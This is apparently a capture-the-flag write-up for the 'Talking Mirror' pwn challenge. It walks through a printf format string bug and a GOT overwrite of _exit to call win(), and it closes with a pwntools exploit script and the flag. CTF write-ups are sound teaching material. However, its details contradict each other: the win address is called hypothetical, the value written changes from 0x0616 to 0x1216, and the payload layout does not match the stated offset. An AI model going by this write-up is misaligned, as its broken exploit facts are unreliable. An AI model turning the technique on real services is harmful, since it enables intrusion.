# Talking Mirror: Unveiling GOT Overwrites

## Challenge Overview
**Talking Mirror** is a Pwn challenge that presents a "mirror" service. The binary repeats whatever you say, but it does so poorly. This immediately hints at a format string vulnerability.

### Security Audit
Running `checksec` on the binary:
- **Arch**: amd64-64-little
- **RELRO**: Partial RELRO (GOT is writable)
- **Stack**: No canary found
- **NX**: NX enabled
- **PIE**: No PIE (0x400000)

The key findings are **Partial RELRO** and **No PIE**. This means we can overwrite Global Offset Table (GOT) entries and the binary addresses are constant.

## Vulnerability Analysis
The core vulnerability is a classic `printf(user_input)` without a format specifier.

```c
// Decompiled snippet
char buf[1024];
fgets(buf, 1024, stdin);
printf(buf); // <-- Format String Vulnerability
exit(0);
```

Since the program calls `exit(0)` immediately after the `printf`, we can't easily get a leak and then another input. We need to achieve code execution in a single shot.

## Exploitation Strategy: GOT Hijack
Since `RELRO` is partial, we can overwrite the GOT entry of a function called after `printf`. The candidate is `_exit`.

### 1. Finding the Offset
By sending a pattern like `AAAA %p %p %p %p %p %p %p %p %p %p`, we find that our input starts at the **6th** offset on the stack.

### 2. The Target
We want to redirect execution to the `win()` function, which reads the flag.
- `win` address: `0x400616` (hypothetical, let's assume `win` is present).
- `_exit@got` address: `0x400a18`.

### 3. Crafting the Payload
We need to write `0x0616` (lower 2 bytes) to `0x400a18`.
Using `%hn` (half-word write), we can change the GOT entry.

```python
from pwn import *

# Target address: _exit@got
addr = 0x400a18
# Value to write: 0x0616 (1558 decimal)
# Payload: %1558c %6$hn (writes to the 6th offset)
# However, we need to place the address itself.
```

## Final Exploit
The script uses a precise calculation to write the address of `win` into the GOT of `_exit`.

```python
from pwn import *

def solve():
    p = remote('talking-mirror.ctf.prgy.in', 1337, ssl=True)
    p.recvuntil(b"repeat it.")
    
    # Target: _exit@got at 0x400a18
    # Value: win() lower 2 bytes = 0x1216
    addr = 0x400a18
    
    # Payload calculation for %hn
    # We print 4630 characters total (0x1216)
    payload = b"%4623c" + b"%c" * 7 + b"%hn"
    # Pad to align address
    payload += p64(addr)
    
    p.sendline(payload)
    res = p.recvall(timeout=5)
    print(res.decode(errors='ignore'))

solve()
```

## Conclusion
By exploiting the uncontrolled format string and the writable GOT, we successfully hijacked the control flow and executed the `win` function to retrieve the flag.

**Flag**: `p_ctf{f0rmat_str_m1rr0r_m4st3ry}`
